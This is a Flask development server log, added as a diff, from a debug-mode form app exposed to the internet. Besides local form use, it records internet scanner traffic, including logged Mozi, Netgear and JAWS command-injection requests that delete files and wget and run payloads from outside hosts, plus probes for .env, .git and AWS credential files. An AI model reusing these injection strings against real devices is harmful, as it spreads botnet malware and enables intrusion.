@@ -1,0 +1,1615 @@
+nohup: ignoring input
+ * Serving Flask app 'app'
+ * Debug mode: on
+[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.1.130:5000
+[33mPress CTRL+C to quit[0m
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 958-398-734
+192.168.1.117 - - [01/Aug/2025 15:21:01] "GET / HTTP/1.1" 200 -
+192.168.1.117 - - [01/Aug/2025 15:21:01] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+192.168.1.117 - - [01/Aug/2025 15:21:04] "GET /templates HTTP/1.1" 200 -
+192.168.1.117 - - [01/Aug/2025 15:21:04] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+192.168.1.117 - - [01/Aug/2025 15:21:06] "GET /fill/Disconnectors HTTP/1.1" 200 -
+192.168.1.117 - - [01/Aug/2025 15:21:06] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+/home/zageabb/flask/flask_form_app/app.py:58: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+  ts = datetime.utcnow().isoformat()
+192.168.1.117 - - [01/Aug/2025 15:22:32] "[32mPOST /fill/Disconnectors HTTP/1.1[0m" 302 -
+192.168.1.117 - - [01/Aug/2025 15:22:32] "GET / HTTP/1.1" 200 -
+192.168.1.117 - - [01/Aug/2025 15:22:33] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+192.168.1.117 - - [01/Aug/2025 15:22:35] "GET /view/7 HTTP/1.1" 200 -
+192.168.1.117 - - [01/Aug/2025 15:22:35] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+192.168.1.117 - - [01/Aug/2025 15:22:48] "GET / HTTP/1.1" 200 -
+192.168.1.117 - - [01/Aug/2025 15:22:48] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+45.194.66.8 - - [01/Aug/2025 15:34:29] "GET / HTTP/1.1" 200 -
+79.124.58.198 - - [01/Aug/2025 15:37:11] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [01/Aug/2025 15:43:25] "GET / HTTP/1.1" 200 -
+204.76.203.219 - - [01/Aug/2025 15:46:53] "GET / HTTP/1.1" 200 -
+79.124.58.198 - - [01/Aug/2025 15:58:03] "[33mPOST /Autodiscover/Autodiscover.xml HTTP/1.1[0m" 404 -
+89.42.231.140 - - [01/Aug/2025 16:04:03] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.1[0m" 404 -
+196.251.70.164 - - [01/Aug/2025 16:05:36] "GET / HTTP/1.1" 200 -
+206.168.34.65 - - [01/Aug/2025 16:06:08] "GET / HTTP/1.1" 200 -
+206.168.34.65 - - [01/Aug/2025 16:06:30] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03f\x11N\x02b\x14\x82\x12Å½õrx/\x8f°+¼¬Æ¶+sBHbv}1\x93^\xad')
+206.168.34.65 - - [01/Aug/2025 16:06:30] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03f\x11N\x02b\x14\x82\x12Å½õrx/\x8f°+¼¬Æ¶+sBHbv}1\x93^­ \x0fZÒu\x11£,\x08[0m" 400 -
+167.94.138.182 - - [01/Aug/2025 16:06:37] "GET / HTTP/1.1" 200 -
+167.94.138.182 - - [01/Aug/2025 16:06:38] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+167.94.138.182 - - [01/Aug/2025 16:06:39] code 505, message Invalid HTTP version (2.0)
+167.94.138.182 - - [01/Aug/2025 16:06:39] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+167.94.138.182 - - [01/Aug/2025 16:07:12] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+176.65.149.159 - - [01/Aug/2025 16:07:13] "GET / HTTP/1.1" 200 -
+206.168.34.65 - - [01/Aug/2025 16:07:16] code 400, message Bad request syntax ('ZG\x00\x00\x00\x05\x00+\x0e\x01\x00')
+206.168.34.65 - - [01/Aug/2025 16:07:16] "[31m[1mZG\x00\x00\x00\x05\x00+\x0e\x01\x00[0m" 400 -
+167.94.138.182 - - [01/Aug/2025 16:07:20] code 505, message Invalid HTTP version (2.0)
+167.94.138.182 - - [01/Aug/2025 16:07:20] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+167.94.138.182 - - [01/Aug/2025 16:07:35] code 400, message Bad request version ('À\x14À')
+167.94.138.182 - - [01/Aug/2025 16:07:35] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03ÎZÐ\x87,ñí\x93\x0f\x80­|ç\x0fí\x0e\x93\x8f+\x1ea¡« \x17?hk¦C y \x80@0·\x08TZÐ®Ü¾O\x02­Ï" \x9a\x89eÂxdüX\x97~K_êw\x16\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À[0m" 400 -
+167.94.138.182 - - [01/Aug/2025 16:07:37] "[33mGET /login HTTP/1.1[0m" 404 -
+149.50.96.114 - - [01/Aug/2025 16:09:28] "GET / HTTP/1.1" 200 -
+79.124.58.198 - - [01/Aug/2025 16:14:44] "[33mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+149.50.96.5 - - [01/Aug/2025 16:15:29] "GET / HTTP/1.1" 200 -
+79.124.58.198 - - [01/Aug/2025 16:16:10] "[33mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+79.124.58.198 - - [01/Aug/2025 16:37:56] "[33mGET /solr/admin/info/system?wt=json HTTP/1.1[0m" 404 -
+91.224.92.17 - - [01/Aug/2025 16:39:39] "GET / HTTP/1.1" 200 -
+79.124.58.198 - - [01/Aug/2025 16:47:59] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 -
+91.224.92.17 - - [01/Aug/2025 17:08:37] "GET / HTTP/1.1" 200 -
+45.194.66.8 - - [01/Aug/2025 17:20:17] "GET / HTTP/1.1" 200 -
+79.124.58.198 - - [01/Aug/2025 17:27:23] "[33mGET /console/ HTTP/1.1[0m" 404 -
+104.155.51.81 - - [01/Aug/2025 17:35:06] "GET / HTTP/1.1" 200 -
+89.42.231.140 - - [01/Aug/2025 17:38:55] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.1[0m" 404 -
+79.124.58.198 - - [01/Aug/2025 17:39:04] "[33mGET /_ignition/execute-solution HTTP/1.1[0m" 404 -
+204.76.203.219 - - [01/Aug/2025 17:43:02] "GET / HTTP/1.1" 200 -
+79.124.58.198 - - [01/Aug/2025 17:49:10] "GET / HTTP/1.1" 200 -
+79.124.58.198 - - [01/Aug/2025 18:11:25] "GET / HTTP/1.1" 200 -
+103.42.243.188 - - [01/Aug/2025 18:17:15] code 400, message Bad HTTP/0.9 request type ('27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$')
+103.42.243.188 - - [01/Aug/2025 18:17:15] "[31m[1m27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0[0m" 400 -
+151.238.102.76 - - [01/Aug/2025 18:17:32] "GET / HTTP/1.1" 200 -
+79.124.58.198 - - [01/Aug/2025 18:32:54] "[33mGET /actuator/gateway/routes HTTP/1.1[0m" 404 -
+170.39.218.2 - - [01/Aug/2025 18:35:34] code 400, message Bad request version ('À\x13À')
+170.39.218.2 - - [01/Aug/2025 18:35:34] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x08\x8cù\x8bañùï\x03>I·IHyöý.\x83JkÕ\x06u\x98RÇ1\\Þ\x1dG µ]Ò7\x1eÔu4\x1bªWXw\x9d\x02Èº*q\\ýÓ\x0fC®Î\x9a»2å;Õ\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+170.39.218.2 - - [01/Aug/2025 18:35:34] "GET / HTTP/1.1" 200 -
+170.39.218.2 - - [01/Aug/2025 18:35:34] "GET / HTTP/1.1" 200 -
+170.39.218.2 - - [01/Aug/2025 18:35:34] "[33mGET /.aws/credentials HTTP/1.1[0m" 404 -
+149.50.96.5 - - [01/Aug/2025 18:37:57] "[33mGET /admin/login.asp HTTP/1.1[0m" 404 -
+141.98.11.57 - - [01/Aug/2025 18:44:18] code 400, message Bad request version ('}')
+141.98.11.57 - - [01/Aug/2025 18:44:18] "[31m[1mÿ\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ñ\x03%\x00\x00\x00{ "Ret" : 100, "SessionID" : "0x0" }[0m" 400 -
+220.76.29.191 - - [01/Aug/2025 18:45:38] "GET / HTTP/1.0" 200 -
+93.174.93.12 - - [01/Aug/2025 18:53:15] "GET / HTTP/1.0" 200 -
+103.42.243.220 - - [01/Aug/2025 18:56:24] "[33mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0[0m" 404 -
+89.42.231.140 - - [01/Aug/2025 18:56:56] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.1[0m" 404 -
+79.124.58.198 - - [01/Aug/2025 19:08:55] "[33mGET /geoserver HTTP/1.1[0m" 404 -
+45.194.66.8 - - [01/Aug/2025 19:12:49] "GET / HTTP/1.1" 200 -
+199.45.154.118 - - [01/Aug/2025 19:20:31] "GET / HTTP/1.1" 200 -
+199.45.154.118 - - [01/Aug/2025 19:20:32] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+199.45.154.118 - - [01/Aug/2025 19:20:33] code 505, message Invalid HTTP version (2.0)
+199.45.154.118 - - [01/Aug/2025 19:20:33] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+199.45.154.118 - - [01/Aug/2025 19:20:37] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+199.45.154.118 - - [01/Aug/2025 19:20:38] code 505, message Invalid HTTP version (2.0)
+199.45.154.118 - - [01/Aug/2025 19:20:38] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+199.45.154.118 - - [01/Aug/2025 19:20:42] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03k7+*Ø¯\x9d\x84¤\x88Æ´ÓC\x11TB²fôØ¶Üd\x9f\x94\x01Z½$r3')
+199.45.154.118 - - [01/Aug/2025 19:20:42] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03k7+*Ø¯\x9d\x84¤\x88Æ´ÓC\x11TB²fôØ¶Üd\x9f\x94\x01Z½$r3 ù\x93nü?å>+Ü\x7f60Èdïã\x16[0m" 400 -
+199.45.154.118 - - [01/Aug/2025 19:20:43] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+176.65.148.92 - - [01/Aug/2025 19:20:57] "[33mCONNECT example.com:443 HTTP/1.1[0m" 404 -
+204.76.203.219 - - [01/Aug/2025 19:42:35] "GET / HTTP/1.1" 200 -
+185.242.226.99 - - [01/Aug/2025 19:47:08] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00\x8c\x01\x00\x00\x88\x03\x03\x93¼öê¥ãÕ9+Öå¿Z:µ+·#ùË\x8doL1[\x9c«zð6U5\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+185.242.226.99 - - [01/Aug/2025 19:47:08] "[31m[1m\x16\x03\x01\x00\x8c\x01\x00\x00\x88\x03\x03\x93¼öê¥ãÕ9+Öå¿Z:µ+·#ùË\x8doL1[\x9c«zð6U5\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+149.50.96.114 - - [01/Aug/2025 19:59:32] "GET / HTTP/1.1" 200 -
+79.124.58.198 - - [01/Aug/2025 20:06:08] code 400, message Bad request version ('Hò\x05â%æ9Ö\x13`b\x13\x93M9àõ\x80\x063%û\x9açnO')
+79.124.58.198 - - [01/Aug/2025 20:06:08] "[31m[1m\x16\x03\x01\x05¨\x01\x00\x05¤\x03\x03\x16x\x03\x13\x00TölDï\x8cÄ;§R\x80K.àã\x08f U7TbÉ\x16«òÝ Hò\x05â%æ9Ö\x13`b\x13\x93M9àõ\x80\x063%û\x9açnO[0m" 400 -
+193.46.255.153 - - [01/Aug/2025 20:06:21] "GET / HTTP/1.1" 200 -
+185.247.137.15 - - [01/Aug/2025 20:13:01] "GET / HTTP/1.1" 200 -
+89.42.231.140 - - [01/Aug/2025 20:15:27] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.1[0m" 404 -
+91.105.104.243 - - [01/Aug/2025 20:22:22] "GET / HTTP/1.1" 200 -
+185.242.226.99 - - [01/Aug/2025 20:23:28] "GET / HTTP/1.1" 200 -
+45.194.66.8 - - [01/Aug/2025 20:44:08] "GET / HTTP/1.1" 200 -
+57.151.98.211 - - [01/Aug/2025 20:48:31] "[33mGET /hudson HTTP/1.1[0m" 404 -
+167.94.145.102 - - [01/Aug/2025 20:49:07] "GET / HTTP/1.1" 200 -
+167.94.145.102 - - [01/Aug/2025 20:49:11] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+167.94.145.102 - - [01/Aug/2025 20:49:11] code 505, message Invalid HTTP version (2.0)
+167.94.145.102 - - [01/Aug/2025 20:49:11] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+167.94.145.102 - - [01/Aug/2025 20:49:15] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+167.94.145.102 - - [01/Aug/2025 20:49:16] code 505, message Invalid HTTP version (2.0)
+167.94.145.102 - - [01/Aug/2025 20:49:16] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+167.94.145.102 - - [01/Aug/2025 20:49:19] code 400, message Bad request version ('v\x8aÓª64¥\x84\x83\x99')
+167.94.145.102 - - [01/Aug/2025 20:49:19] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x86\x97¥êÒ!<Æ32GÝ\x0dIþk>ÔW\x8bù\x96d.³Kµ¦­QÕÖ J°k\x87\x0d ]\x1e\x0bv\x8aÓª64¥\x84\x83\x99[0m" 400 -
+167.94.145.102 - - [01/Aug/2025 20:49:20] "[33mGET /wiki HTTP/1.1[0m" 404 -
+204.76.203.219 - - [01/Aug/2025 21:23:53] "GET / HTTP/1.1" 200 -
+149.50.96.5 - - [01/Aug/2025 21:30:07] "[33mGET /dispatch.asp HTTP/1.1[0m" 404 -
+185.170.144.3 - - [01/Aug/2025 21:36:52] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.170.144.3 - - [01/Aug/2025 21:36:52] "[31m[1m\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr[0m" 400 -
+89.42.231.140 - - [01/Aug/2025 21:40:53] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.1[0m" 404 -
+8.222.218.12 - - [01/Aug/2025 21:44:24] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1')
+8.222.218.12 - - [01/Aug/2025 21:44:24] "[31m[1mGET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1[0m" 400 -
+210.90.201.181 - - [01/Aug/2025 22:14:29] "GET / HTTP/1.0" 200 -
+45.194.66.8 - - [01/Aug/2025 22:29:26] "GET / HTTP/1.1" 200 -
+149.50.96.114 - - [01/Aug/2025 22:41:25] "GET / HTTP/1.1" 200 -
+45.230.66.99 - - [01/Aug/2025 22:53:38] code 400, message Bad HTTP/0.9 request type ('27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$')
+45.230.66.99 - - [01/Aug/2025 22:53:38] "[31m[1m27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0[0m" 400 -
+89.42.231.140 - - [01/Aug/2025 23:07:41] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.1[0m" 404 -
+91.224.92.17 - - [01/Aug/2025 23:21:07] "GET / HTTP/1.1" 200 -
+204.76.203.219 - - [01/Aug/2025 23:24:20] "GET / HTTP/1.1" 200 -
+128.199.113.168 - - [01/Aug/2025 23:31:36] "[33mGET /.env HTTP/1.1[0m" 404 -
+128.199.113.168 - - [01/Aug/2025 23:31:37] "[33mGET /.git/config HTTP/1.1[0m" 404 -
+193.46.255.153 - - [01/Aug/2025 23:47:57] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [01/Aug/2025 23:54:55] "GET / HTTP/1.1" 200 -
+45.194.66.8 - - [01/Aug/2025 23:58:46] "GET / HTTP/1.1" 200 -
+141.98.11.57 - - [02/Aug/2025 00:07:06] code 400, message Bad request version ('}')
+141.98.11.57 - - [02/Aug/2025 00:07:06] "[31m[1mÿ\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ñ\x03%\x00\x00\x00{ "Ret" : 100, "SessionID" : "0x0" }[0m" 400 -
+147.185.132.12 - - [02/Aug/2025 00:19:19] "GET / HTTP/1.1" 200 -
+89.42.231.140 - - [02/Aug/2025 00:28:21] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.1[0m" 404 -
+93.174.93.12 - - [02/Aug/2025 00:30:56] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+93.174.93.12 - - [02/Aug/2025 00:30:56] "[31m[1m\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RHÅ\x1a#÷:Nßâ´\x82/ÿ\x09T\x9f§Äy°hÆ\x13\x8c¤\x1c="á\x1a\x98 \x84´,\x85¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À[0m" 400 -
+162.216.149.235 - - [02/Aug/2025 00:33:16] "GET / HTTP/1.1" 200 -
+87.255.194.135 - - [02/Aug/2025 00:52:50] "[33mGET /admin/configs.php HTTP/1.0[0m" 404 -
+91.224.92.17 - - [02/Aug/2025 01:06:21] "GET / HTTP/1.1" 200 -
+204.76.203.219 - - [02/Aug/2025 01:13:21] "GET / HTTP/1.1" 200 -
+45.194.66.8 - - [02/Aug/2025 01:27:47] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [02/Aug/2025 01:51:16] "GET / HTTP/1.1" 200 -
+172.236.228.86 - - [02/Aug/2025 01:53:04] code 400, message Bad request syntax ('\x16\x03\x01\x01')
+172.236.228.86 - - [02/Aug/2025 01:53:04] "[31m[1m\x16\x03\x01\x01[0m" 400 -
+172.236.228.86 - - [02/Aug/2025 01:53:04] code 400, message Bad request syntax ('\x16\x03\x01\x01')
+172.236.228.86 - - [02/Aug/2025 01:53:04] "[31m[1m\x16\x03\x01\x01[0m" 400 -
+89.42.231.140 - - [02/Aug/2025 01:54:38] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.1[0m" 404 -
+206.168.34.67 - - [02/Aug/2025 01:56:00] "GET / HTTP/1.1" 200 -
+206.168.34.67 - - [02/Aug/2025 01:56:05] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+206.168.34.67 - - [02/Aug/2025 01:56:08] code 505, message Invalid HTTP version (2.0)
+206.168.34.67 - - [02/Aug/2025 01:56:08] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+206.168.34.67 - - [02/Aug/2025 01:56:17] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+206.168.34.67 - - [02/Aug/2025 01:56:18] code 505, message Invalid HTTP version (2.0)
+206.168.34.67 - - [02/Aug/2025 01:56:18] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+206.168.34.67 - - [02/Aug/2025 01:56:27] code 400, message Bad request version ('À\x14À')
+206.168.34.67 - - [02/Aug/2025 01:56:27] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03?\x91Ó\x1c\x8dN@[æ\x98D¦\x12")+\x1bà\x10\x82çê\x14þØ\x952Êtà*, pî@Åñl\x1e\x8a,\x88¦4hØBÆÜn\x13Ñ\x0b\x17\x11\x80î\x0d\x17=<ìïe\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À[0m" 400 -
+206.168.34.67 - - [02/Aug/2025 01:56:30] "[33mGET /sitemap.xml HTTP/1.1[0m" 404 -
+198.235.24.53 - - [02/Aug/2025 02:03:12] "GET / HTTP/1.0" 200 -
+147.185.132.234 - - [02/Aug/2025 02:14:25] code 400, message Bad request version ('À\x13À')
+147.185.132.234 - - [02/Aug/2025 02:14:25] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03rùH9$ìÝ­f\x00Ç\x9f\x10çÃ\x91Ö0^8bÌ&\x0fWpòÄ[\x03|\x9f Ü\x0d\x1f%ÎwÆ\x88»lÚd\x9e¯¯/éîìÌ\x06¢`AJ6\x97·|lWZ\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+147.185.132.234 - - [02/Aug/2025 02:14:26] code 400, message Bad request syntax ('\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03\x96?}®È\x0eó¦\x80íÝ')
+147.185.132.234 - - [02/Aug/2025 02:14:26] "[31m[1m\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03\x96?}®È\x0eó¦\x80íÝ[0m" 400 -
+91.224.92.17 - - [02/Aug/2025 02:22:49] "GET / HTTP/1.1" 200 -
+193.46.255.153 - - [02/Aug/2025 02:29:36] "GET / HTTP/1.1" 200 -
+69.164.217.74 - - [02/Aug/2025 02:32:45] "GET / HTTP/1.1" 200 -
+172.234.217.129 - - [02/Aug/2025 02:32:59] "GET / HTTP/1.1" 200 -
+172.236.228.38 - - [02/Aug/2025 02:37:51] "GET / HTTP/1.1" 200 -
+149.50.96.114 - - [02/Aug/2025 03:09:11] "GET / HTTP/1.1" 200 -
+204.76.203.219 - - [02/Aug/2025 03:14:41] "GET / HTTP/1.1" 200 -
+89.42.231.140 - - [02/Aug/2025 03:19:22] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.1[0m" 404 -
+45.194.66.8 - - [02/Aug/2025 03:21:26] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [02/Aug/2025 03:37:27] "GET / HTTP/1.1" 200 -
+149.50.96.5 - - [02/Aug/2025 04:31:09] "GET / HTTP/1.1" 200 -
+64.23.142.143 - - [02/Aug/2025 04:43:35] code 400, message Bad request version ('À\x14À')
+64.23.142.143 - - [02/Aug/2025 04:43:35] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x9d§\x15ÖR§og+FÚ£x_\x95*\x98R\x194£5\x18\x82å\x07b\x9b\x1fvas\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+64.23.142.143 - - [02/Aug/2025 04:43:36] code 400, message Bad request version ('À\x14À')
+64.23.142.143 - - [02/Aug/2025 04:43:36] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03+¬\x01'\x96À©\x0b`h\x8eyÞØ÷Ç\x8d¾X\x0d\x0cÚlgj\x8faø³m÷p\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+64.23.142.143 - - [02/Aug/2025 04:43:36] "GET / HTTP/1.1" 200 -
+64.23.142.143 - - [02/Aug/2025 04:43:36] "[33mGET /form.html HTTP/1.1[0m" 404 -
+64.23.142.143 - - [02/Aug/2025 04:43:37] "[33mGET /upl.php HTTP/1.1[0m" 404 -
+64.23.142.143 - - [02/Aug/2025 04:43:37] "[33mGET /t4 HTTP/1.1[0m" 404 -
+64.23.142.143 - - [02/Aug/2025 04:43:38] "[33mGET /geoip/ HTTP/1.1[0m" 404 -
+64.23.142.143 - - [02/Aug/2025 04:43:38] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+64.23.142.143 - - [02/Aug/2025 04:43:38] "[33mGET /1.php HTTP/1.1[0m" 404 -
+64.23.142.143 - - [02/Aug/2025 04:43:39] "[33mGET /systembc/password.php HTTP/1.1[0m" 404 -
+64.23.142.143 - - [02/Aug/2025 04:43:39] "[33mGET /password.php HTTP/1.1[0m" 404 -
+91.224.92.17 - - [02/Aug/2025 04:49:41] "GET / HTTP/1.1" 200 -
+89.42.231.140 - - [02/Aug/2025 05:03:23] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.1[0m" 404 -
+149.50.96.5 - - [02/Aug/2025 05:05:13] "[33mGET /page/style/index.css HTTP/1.1[0m" 404 -
+204.76.203.219 - - [02/Aug/2025 05:14:01] "GET / HTTP/1.1" 200 -
+45.194.66.8 - - [02/Aug/2025 05:24:15] "GET / HTTP/1.1" 200 -
+135.222.40.117 - - [02/Aug/2025 05:31:59] "[33mGET /developmentserver/metadatauploader HTTP/1.1[0m" 404 -
+65.49.1.182 - - [02/Aug/2025 05:58:57] "GET / HTTP/1.1" 200 -
+65.49.1.187 - - [02/Aug/2025 06:02:02] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+65.49.1.182 - - [02/Aug/2025 06:02:36] "[33mGET /geoserver/web/ HTTP/1.1[0m" 404 -
+91.224.92.17 - - [02/Aug/2025 06:11:43] "GET / HTTP/1.1" 200 -
+141.98.11.57 - - [02/Aug/2025 06:14:41] code 400, message Bad request version ('}')
+141.98.11.57 - - [02/Aug/2025 06:14:41] "[31m[1mÿ\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ñ\x03%\x00\x00\x00{ "Ret" : 100, "SessionID" : "0x0" }[0m" 400 -
+89.42.231.140 - - [02/Aug/2025 06:27:03] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.1[0m" 404 -
+165.154.41.182 - - [02/Aug/2025 06:31:52] "GET / HTTP/1.1" 200 -
+165.154.41.182 - - [02/Aug/2025 06:31:53] code 400, message Bad request version ('´äËó^äª|ýyÕ{\xadf\x96°\x064')
+165.154.41.182 - - [02/Aug/2025 06:31:53] "[31m[1m\x16\x03\x01\x00ò\x01\x00\x00î\x03\x03U¹\x12TÛ\x04è ¯Z\x93ð4Fº»rõ\x1c\x05¢"(\x93T:ùÛúò\x08\x15 ´äËó^äª|ýyÕ{­f\x96°\x064[0m" 400 -
+165.154.41.182 - - [02/Aug/2025 06:31:54] code 400, message Bad HTTP/0.9 request type ('t3')
+165.154.41.182 - - [02/Aug/2025 06:31:54] "[31m[1mt3 12.1.2[0m" 400 -
+152.32.245.186 - - [02/Aug/2025 06:32:04] "GET / HTTP/1.1" 200 -
+152.32.245.186 - - [02/Aug/2025 06:32:04] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+152.32.245.186 - - [02/Aug/2025 06:32:05] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+152.32.245.186 - - [02/Aug/2025 06:32:05] "[33mGET /sitemap.xml HTTP/1.1[0m" 404 -
+45.194.66.8 - - [02/Aug/2025 06:48:00] "GET / HTTP/1.1" 200 -
+149.50.96.5 - - [02/Aug/2025 07:08:04] "[33mGET /userRpmNatDebugRpm26525557/start_art.html HTTP/1.1[0m" 404 -
+204.76.203.219 - - [02/Aug/2025 07:09:33] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [02/Aug/2025 07:19:08] "GET / HTTP/1.1" 200 -
+149.50.96.114 - - [02/Aug/2025 07:19:46] "GET / HTTP/1.1" 200 -
+185.242.226.99 - - [02/Aug/2025 07:37:13] code 400, message Bad request version ('À\x14À')
+185.242.226.99 - - [02/Aug/2025 07:37:13] "[31m[1m\x16\x03\x01\x00\x8c\x01\x00\x00\x88\x03\x03÷oÜÂU¨Y\x1d­âÖ\x8aÊ\x025×õW=&QpÚ!EsÝÐ3\x8dù¢\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+196.251.86.50 - - [02/Aug/2025 07:50:58] "[33mGET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=ZWNobwltZW93 HTTP/1.0[0m" 404 -
+89.42.231.140 - - [02/Aug/2025 07:57:39] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.1[0m" 404 -
+197.37.108.32 - - [02/Aug/2025 07:58:48] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ 45.153.34.39/jaws;sh+/tmp/jaws HTTP/1.1')
+197.37.108.32 - - [02/Aug/2025 07:58:48] "[31m[1mGET /shell?cd+/tmp;rm+-rf+*;wget+ 45.153.34.39/jaws;sh+/tmp/jaws HTTP/1.1[0m" 400 -
+185.242.226.99 - - [02/Aug/2025 08:04:09] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [02/Aug/2025 08:09:21] "GET / HTTP/1.1" 200 -
+103.20.102.84 - - [02/Aug/2025 08:18:13] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+45.194.66.8 - - [02/Aug/2025 08:32:35] "GET / HTTP/1.1" 200 -
+117.72.194.220 - - [02/Aug/2025 08:41:30] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1')
